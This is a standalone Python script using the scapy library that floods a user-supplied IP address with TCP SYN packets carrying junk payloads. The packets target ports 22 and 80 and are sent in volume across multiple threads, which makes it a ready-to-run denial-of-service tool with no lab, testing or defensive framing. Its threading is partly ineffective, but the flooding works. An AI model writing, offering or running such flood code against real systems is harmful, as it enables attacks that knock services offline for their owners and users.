from scapy.all import *
import threading
import signal
import sys

# Global variables
send_lock = threading.Lock()
stop_event = threading.Event()

def generate_packet(target_ip):
    """
    Generate a TCP SYN packet with specified destination IP.

    :param target_ip: The destination IP address for the packet.
    :type target_ip: str
    :return: The generated packet.
    :rtype: scapy.Packet
    """
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=[22, 80], seq=12345, ack=1000, window=1000, flags=["S"])
    raw = Raw(b"X" * 1024)
    return ip / tcp / raw

def send_packets_thread(target_ip, num_packets):
    """
    Send a specified number of packets to a target IP in a separate thread.

    :param target_ip: The target IP address to send packets to.
    :type target_ip: str
    :param num_packets: The number of packets to send.
    :type num_packets: int
    """
    packets = [generate_packet(target_ip) for _ in range(num_packets)]

    try:
        with send_lock:
            send(packets, verbose=0)
        if not stop_event.is_set():
            print(f"Thread sent {num_packets} packets successfully.")
    except KeyboardInterrupt:
        print("Thread KeyboardInterrupt. Stopping the thread gracefully.")
    finally:
        stop_event.set()

def signal_handler(sig, frame):
    """
    Handle KeyboardInterrupt signal.

    :param sig: The signal number.
    :type sig: int
    :param frame: The current stack frame.
    :type frame: frame object
    """
    print("Main KeyboardInterrupt. Stopping threads gracefully.")
    stop_event.set()
    sys.exit(0)

def send_packets(target_ip, num_packets, num_threads):
    """
    Send packets to a target IP using multiple threads.

    :param target_ip: The target IP address to send packets to.
    :type target_ip: str
    :param num_packets: The number of packets to send per thread.
    :type num_packets: int
    :param num_threads: The number of threads to use.
    :type num_threads: int
    """
    signal.signal(signal.SIGINT, signal_handler)
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_packets_thread, args=(target_ip, num_packets))
        threads.append(thread)

    try:
        # Start threads
        for thread in threads:
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

        print(f"Sent {num_threads * num_packets} packets successfully.")
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    target_ip = input("Enter the target IP: ")
    num_packets = int(input("Enter the number of packets to send per thread: "))
    num_threads = int(input("Enter the number of threads: "))

    send_packets(target_ip, num_packets, num_threads)
